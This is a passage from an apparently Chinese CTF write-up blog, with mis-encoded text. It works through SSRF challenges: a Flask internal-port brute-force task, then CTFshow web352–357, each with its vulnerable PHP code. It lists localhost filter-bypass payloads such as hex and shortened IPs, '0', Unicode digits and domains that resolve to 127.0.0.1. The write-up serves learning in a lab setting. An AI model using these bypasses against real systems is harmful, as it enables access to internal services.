class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;uploads/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mimetype</span>(<span class="params">file_path</span>):</span><br><span class="line">    mime = mimetypes.guess_type(file_path)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> mime <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> Image.<span class="built_in">open</span>(file_path) <span class="keyword">as</span> img:</span><br><span class="line">                mime = img.get_format_mimetype()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            mime = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> mime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_free_port_in_range</span>(<span class="params">start_port, end_port</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        port = random.randint(start_port, end_port)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> port </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;å›¾ç‰‡ä¸Šä¼ &lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;å·²ä¸Šä¼ çš„å›¾ç‰‡&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span> <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æœªæ‰¾åˆ°æ–‡ä»¶éƒ¨åˆ†&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æœªé€‰æ‹©æ–‡ä»¶&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line"></span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ”¯æŒ&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image/&lt;filename&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>(<span class="params">filename</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        mime = get_mimetype(filepath)</span><br><span class="line">        <span class="keyword">return</span> send_file(filepath, mimetype=mime)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æ–‡ä»¶æœªæ‰¾åˆ°&#x27;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    port = find_free_port_in_range(<span class="number">5001</span>, <span class="number">6000</span>)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é™„ä»¶å¯çŸ¥ï¼Œflagä¸€å›¾ç‰‡å½¢å¼è¢«å­˜å‚¨åœ¨å†…ç½‘çš„uploadsæ–‡ä»¶å¤¹ä¸‹é¢ï¼Œå¹¶é€šè¿‡imageç›®å½•è®¿é—®ï¼Œå¤–éƒ¨æœåŠ¡å¼€æ”¾æŒ‡å®šç«¯å£5000ï¼Œå†…éƒ¨æœåŠ¡åˆ™å¼€æ”¾åœ¨5001-6000çš„éšæœºç«¯å£ï¼Œ</p>
<p>è¿™é‡Œç”»äº†å¼ å›¾ç”¨æ¥ç†è§£ï¼š</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|     ä½ è®¿é—®çš„ç½‘ç«™         |</span><br><span class="line"><span class="section">|  http://...:5000         |</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="code">             v ä½ ä¼ å…¥ SSRF URL</span></span><br><span class="line"><span class="code">     /image?url=http://localhost:PORT/image/flag.jpg</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="section">             v</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="section">| å¤–éƒ¨ Flask æœåŠ¡ (5000ç«¯å£)|</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="code">             v å‘èµ·è¯·æ±‚</span></span><br><span class="line"><span class="code">     http://localhost:PORT/image/flag.jpg</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="section">             v</span></span><br><span class="line"><span class="section">+---------------------------+</span></span><br><span class="line">| å†…éƒ¨ Flask æœåŠ¡ï¼ˆéšæœºç«¯å£ï¼‰|</span><br><span class="line">| å¯èƒ½åœ¨ 5001~6000 ä¹‹é—´      |</span><br><span class="line"><span class="section">| æä¾› /image/flag.jpg æ¥å£  |</span></span><br><span class="line"><span class="section">+---------------------------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å› æ­¤éœ€è¦æŠ“åŒ…çˆ†ç ´ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png" alt="image-20250416011910810"></p>
<p>æˆåŠŸçˆ†å‡ºå›¾ç‰‡ï¼Œæˆªå›¾OCRå¹¶ä¿®æ”¹å³å¯ã€‚</p>
<h2 id="CTFshowåˆ·é¢˜"><a href="#CTFshowåˆ·é¢˜" class="headerlink" title="CTFshowåˆ·é¢˜"></a>CTFshowåˆ·é¢˜</h2><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›¸æ¯”äºä¸Šé¢˜ï¼Œwafäº†æœ¬åœ°å›ç¯åœ°å€ï¼Œå°è¯•ç”¨å…¶ä»–è¿›åˆ¶çš„IPç»•è¿‡å³å¯ã€‚</p>
<p>ä½†å®é™…ä¸Šï¼Œè¿™é‡Œæºç æ˜¯å†™é”™äº†ï¼Œæ²¡æœ‰ä¼ å‚åŒ¹é…å¯¼è‡´æ’ä¸ºçœŸï¼Œæ‰€ä»¥æ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416002956517.png" alt="image-20250416002956517"></p>
<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>æ­£åˆ™å¦‚ä¸‹ï¼š</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/localhost</span>|127\<span class="string">.0</span>\.|\ã€‚<span class="string">/i</span></span><br></pre></td></tr></table></figure>

<p>å¤šè¿‡æ»¤äº†<code>ã€‚</code>è¿˜æ˜¯ç”¨ä¸Šé¢˜çš„æ€è·¯å³å¯ã€‚</p>
<p>è¿™é¢˜æœ‰å¤šç§ç»•è¿‡æ€è·¯ï¼Œç½‘ä¸Šéƒ½æ€»ç»“äº†å¾ˆå¤šï¼Œè¿™é‡Œéšä¾¿è´´ä¸€ä»½ç›¸å¯¹å…¨çš„ï¼š</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¿›åˆ¶ç»•è¿‡ 		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>ç»•è¿‡		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">ç‰¹æ®Šçš„åœ°å€<span class="number">0</span>ï¼Œ		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0/flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ª 0 åœ¨linuxç³»ç»Ÿä¸­ä¸€èˆ¬ä¼šè§£ææˆ127.0.0.1 ï¼Œåœ¨windows å’Œ macos ä¸­ä¸€èˆ¬è§£ææˆ0.0.0.0</span></span><br><span class="line"></span><br><span class="line">è¿˜æœ‰			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.1/flag.php //å¯çœç•¥0</span></span><br><span class="line">è¿˜æœ‰			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.0000000000000.001/flag.php</span></span><br><span class="line">ç‰¹æ®Šå­—ç¬¦       <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//â‘ â‘¡â‘¦.â“ª.â“ª.â‘ /flag.php</span></span><br><span class="line">ç”¨ä¸­æ–‡å¥å·ç»•è¿‡  <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127ã€‚0ã€‚0ã€‚1/</span></span><br></pre></td></tr></table></figure>



<h3 id="web354-å…¬å…±è§£æåŸŸåç»•è¿‡"><a href="#web354-å…¬å…±è§£æåŸŸåç»•è¿‡" class="headerlink" title="web354 å…¬å…±è§£æåŸŸåç»•è¿‡"></a>web354 å…¬å…±è§£æåŸŸåç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>è¿‡æ»¤äº†0å’Œ1å°±æœ‰äº›éš¾æäº†ï¼Œä¸è¿‡è¿™é‡Œå¯ä»¥å»ç½‘ä¸Šæœç´¢ä¸€äº›å…¬å…±çš„èƒ½å¤ŸåŸŸåè§£æåˆ°127.0.0.1çš„urlã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416080803299.png" alt="image-20250416080803299"></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//safe.taobao.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//114.taobao.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//wifi.aliyun.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//imis.qq.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//localhost.sec.qq.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//ecd.tencent.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//sudo.cc/</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨å°±å¥½äº†ã€‚</p>
<p>æ›´å¤šçš„å¯ä»¥é€šè¿‡åŸŸåè§£æç»“æœåå‘æŸ¥æ‰¾ï¼š<a target="_blank" rel="noopener" href="https://site.ip138.com/127.0.0.1/">127.0.0.1ä¸Šçš„ç½‘ç«™ 127.0.0.1åŒiPåŸŸåæŸ¥è¯¢ 127.0.0.1åŸŸååæŸ¥</a></p>
<h3 id="web355-é•¿åº¦é™åˆ¶1"><a href="#web355-é•¿åº¦é™åˆ¶1" class="headerlink" title="web355 é•¿åº¦é™åˆ¶1"></a>web355 é•¿åº¦é™åˆ¶1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>) &lt;= <span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>å¢åŠ äº†é•¿åº¦é™åˆ¶ï¼Œç”¨<code>url=http://0/flag.php</code>ã€ <code>url=http://127.1/flag.php</code>éƒ½å¯ä»¥ã€‚</p>
<h3 id="web356-é•¿åº¦é™åˆ¶2"><a href="#web356-é•¿åº¦é™åˆ¶2" class="headerlink" title="web356 é•¿åº¦é™åˆ¶2"></a>web356 é•¿åº¦é™åˆ¶2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>url=http://0/flag.php</code>ä»ç„¶å¯ç”¨ã€‚</p>
<h3 id="web357-å†…ç½‘IPè¿‡æ»¤"><a href="#web357-å†…ç½‘IPè¿‡æ»¤" class="headerlink" title="web357 å†…ç½‘IPè¿‡æ»¤"></a>web357 å†…ç½‘IPè¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡äº†ä¸€äº›è¿‡æ»¤ï¼Œæˆ‘ä»¬å»æŸ¥æŸ¥è¿™äº›éƒ½æ˜¯ä»€ä¹ˆï¼š</p>
<h4 id="filter-var-å‡½æ•°"><a href="#filter-var-å‡½æ•°" class="headerlink" title="filter_var() å‡½æ•°"></a>filter_var() å‡½æ•°</h4><p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416083848457.png" alt="image-20250416083848457"></p>
